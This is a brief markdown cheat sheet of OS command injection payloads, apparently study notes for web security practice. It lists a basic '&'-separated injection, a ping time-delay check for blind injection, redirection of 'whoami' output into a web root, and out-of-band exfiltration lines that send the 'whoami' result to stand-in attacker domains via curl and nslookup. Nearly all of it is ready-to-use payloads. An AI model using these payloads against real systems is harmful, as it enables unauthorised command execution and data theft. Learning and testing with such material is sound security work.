# OS command injection

### Command injection

```sh
& echo qwerty &
```

Placing `&` after the injected command is generally useful because it separates the injected command from whatever follows the injection point

### Blind OS command

**Detection**

```sh
# 10 sec. time delay
& ping -c 10 127.0.0.1 &
```

**Exploit**

1. Redirecting output. Note: you must have write permission

```sh
& whoami > /var/www/static/whoami.txt &
curl https://website.com/whoami.txt
```

2. Out-of-band techniques

```sh
& curl `whoami`.webserver-attacker.com & # HTTP traffic may be blocked
& nslookup `whoami`.kgji2ohoyw.web-attacker.com &
```
